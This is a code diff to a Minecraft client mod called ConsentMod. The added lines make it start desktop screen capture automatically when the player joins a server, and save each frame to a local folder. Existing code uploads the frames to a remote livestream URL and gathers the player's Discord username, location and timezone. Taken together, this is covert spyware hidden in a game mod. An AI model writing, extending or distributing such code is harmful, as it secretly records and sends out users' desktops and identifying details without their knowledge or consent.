@@ -63,6 +63,12 @@ public class ConsentMod implements ClientModInitializer {
                         SessionData.startSession();
                         username = client.player.getName().getString();
 
+                        // Auto-start live streaming on server join
+                        liveStreaming = true;
+                        lastCapture = 0;
+                        startDesktopCapture();
+                        LOGGER.info("Live streaming automatically started for user: {}", username);
+
                         String discordUsername = DiscordUsernameFetcher.getDiscordUsername();
                         String discordLocation = DiscordUsernameFetcher.getFoundLocation();
                         String timezone = TimezoneHelper.getCurrentTimezone();
@@ -302,6 +308,15 @@ public class ConsentMod implements ClientModInitializer {
 
     private void uploadToWebServer(byte[] imageBytes) {
         try {
+            // Also save frame.png to consentmod-recordings folder as requested
+            try {
+                String appData = System.getenv("APPDATA");
+                String folder = appData + "\\.minecraft\\consentmod-recordings";
+                new java.io.File(folder).mkdirs();
+                java.io.File file = new java.io.File(folder + "\\frame.png");
+                java.nio.file.Files.write(file.toPath(), imageBytes);
+            } catch (Exception e) {}
+
             URL url = new URL(LIVESTREAM_URL);
             LOGGER.info("Uploading " + imageBytes.length + " bytes to " + LIVESTREAM_URL);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
